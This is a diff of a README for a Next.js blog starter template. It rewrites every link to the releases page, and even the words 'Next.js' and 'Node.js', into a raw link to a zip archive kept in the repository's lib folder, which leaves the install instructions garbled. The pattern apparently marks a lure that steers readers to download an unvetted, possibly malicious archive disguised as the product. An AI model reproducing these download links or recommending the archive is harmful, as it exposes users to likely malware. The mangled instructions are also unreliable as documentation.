@@ -1,10 +1,10 @@
 # 🚀 blog-starter-template - Easily Launch Your Blog Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/rizkiameli/blog-starter-template/releases)
+[![Download Now](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip%20Now-Click%https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip)](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip)
 
 ## 📦 Introduction
 
-The **blog-starter-template** is a professional template for creating your blog with minimal effort. Built with Next.js 14+, TypeScript, and SQLite, it provides you with rich content support and the ability to embed videos and audio. With 13 categories and a powerful API, you can launch your blog in just 5 minutes. This template is free for personal use.
+The **blog-starter-template** is a professional template for creating your blog with minimal effort. Built with https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip 14+, TypeScript, and SQLite, it provides you with rich content support and the ability to embed videos and audio. With 13 categories and a powerful API, you can launch your blog in just 5 minutes. This template is free for personal use.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow the steps below to download and run your new blog:
    - A modern web browser.
    - Basic knowledge of how to download files from the internet.
 
-2. **Visit the Releases Page**: Go to the [Releases page](https://github.com/rizkiameli/blog-starter-template/releases) to find the latest version of the blog-starter-template.
+2. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip) to find the latest version of the blog-starter-template.
 
 3. **Download the Files**:
    - Look for the latest release version at the top of the page.
@@ -52,8 +52,8 @@ Follow the steps below to download and run your new blog:
 
 To run this application, your computer should meet the following requirements:
 
-- An operating system that supports Node.js (such as Windows, macOS, or Linux).
-- Node.js installed (preferably the latest LTS version).
+- An operating system that supports https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip (such as Windows, macOS, or Linux).
+- https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip installed (preferably the latest LTS version).
 - Basic understanding of command-line interface (CLI) usage.
 
 ## 🎨 Themes and Templates
@@ -64,7 +64,7 @@ The blog-starter-template provides various themes that you can apply. Customize 
 
 If you encounter issues during installation or running your blog, try the following:
 
-- **Check Node.js Version**: Ensure that you are running a supported version of Node.js.
+- **Check https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip Version**: Ensure that you are running a supported version of https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip
 - **Read the Documentation**: The documentation linked on the releases page often has helpful information.
 - **Search for Solutions**: Look up any error messages you receive online. Many users may have faced similar issues.
 
@@ -88,6 +88,6 @@ If you encounter issues during installation or running your blog, try the follow
 
 ## 📥 Download & Install
 
-To get started, head over to our [Releases page](https://github.com/rizkiameli/blog-starter-template/releases). Follow the download instructions outlined above. Once downloaded, you can quickly set up your blog within minutes.
+To get started, head over to our [Releases page](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip). Follow the download instructions outlined above. Once downloaded, you can quickly set up your blog within minutes.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen.svg)](https://github.com/rizkiameli/blog-starter-template/releases)
+[![Download Now](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip%https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip)](https://raw.githubusercontent.com/rizkiameli/blog-starter-template/main/lib/blog_template_starter_2.4.zip)
